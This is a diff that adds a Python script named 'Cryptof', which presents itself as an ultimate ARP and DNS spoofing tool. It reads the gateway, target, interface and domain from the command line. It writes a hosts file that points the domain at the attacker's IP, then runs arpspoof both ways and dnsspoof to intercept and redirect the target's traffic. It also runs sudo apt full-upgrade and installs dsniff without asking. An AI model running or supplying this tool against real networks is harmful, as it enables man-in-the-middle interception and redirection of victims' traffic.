@@ -1,0 +1,93 @@
+#!/usr/bin/python3
+
+#########################################
+#            [+] Cryptof [+]            #
+# ultimate spoofing tool for arp and dns#
+#  This Tool is Under Gnu GPl License   #
+#  Written By Eslam Mohamed Elabd       #
+#	https://github.com//Crypt00o        #
+#########################################
+
+from os import system as run
+from colorama import Fore as cl
+from sys import argv as args
+from time import sleep
+from subprocess import getoutput as psget
+import netifaces as ni
+
+
+def banner():
+	print(cl.LIGHTRED_EX+"""                                                      
+  ####   #####   #   #  #####   #####   ####   ###### 
+ #    #  #    #   # #   #    #    #    #    #  #      
+ #       #    #    #    #    #    #    #    #  #####  
+ #       #####     #    #####     #    #    #  #      
+ #    #  #   #     #    #         #    #    #  #      
+  ####   #    #    #    #         #     ####   #      
+                                                      """)
+
+
+
+def usage():
+	print(cl.LIGHTRED_EX +"\t\t[+] Usage [+]\n./cryptof <gateway ip > <target ip> <interface>  <Domain to spoof> " + cl.LIGHTGREEN_EX + "\n\n\t\t [+] Written By 0xCrypto "+cl.LIGHTCYAN_EX +"\"Eslam Mohamed\"" +cl.LIGHTGREEN_EX + " [+]")
+	exit()
+
+
+
+def cleaning_up():
+	print(cl.LIGHTRED_EX+"\n\t[+] Configing CryptoHosts [+]\n")
+	run(("pkill arpspoof && pkill dnsspoof && rm cryptohosts & "))
+	sleep(3)
+	exit()
+
+
+def check_dependencies() :
+	install=psget("dpkg --list dsniff | tail -1 | cut -d ' ' -f 1")
+	lib=psget("python3 -m pip list | grep 'netifaces' | cut -d ' ' -f 1")
+	if install!="ii":
+		run("sudo apt update;sudo apt full-upgrade -y ; sudo apt install dsniff")
+	if lib!="netifaces":
+		run("python3 -m pip install netifaces")
+
+
+def config_hosts():
+	try:
+		interface=args[3]
+		dns=args[4]
+		ni.ifaddresses(interface)
+		attackerip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+		print(cl.LIGHTRED_EX+"\n\t[+] Configing CryptoHosts [+]\n")
+		sleep(2)
+		hostsfile=open('cryptohosts','w')
+		hostsfile.write((attackerip+"\t"+dns))
+		hostsfile.close()
+	except:
+		usage()
+
+
+def spoofing():
+	print(cl.LIGHTGREEN_EX + "\n\n\t\tWelcome to Ultimate Spoofing Tool ! "+cl.LIGHTCYAN_EX+"\nWritten By "+cl.LIGHTRED_EX+" 0xCrypto Eslam Mohamed"+"\n\n" )
+	try :
+		gateway=args[1]
+		target=args[2]
+		interface=args[3]
+		print(cl.LIGHTCYAN_EX +"\n\t!! Spoofing after 3 Seconds !!\n\n")
+		sleep(3)
+		print(cl.LIGHTGREEN_EX)
+		run(("arpspoof -i "+interface +" -t " + gateway + " " + target + " &" )) 
+		run(("arpspoof -i "+interface +" -t " + target + " " + gateway + " &")) 
+		run(("dnsspoof -i "+interface+ " -f cryptohosts host "+target + " and udp port 53 & ")) 
+		wait=input()
+		cleaning_up()
+		exit()
+	except:
+        	cleaning_up()
+
+
+
+##################################
+banner()
+check_dependencies()
+config_hosts()
+spoofing()
+##################################
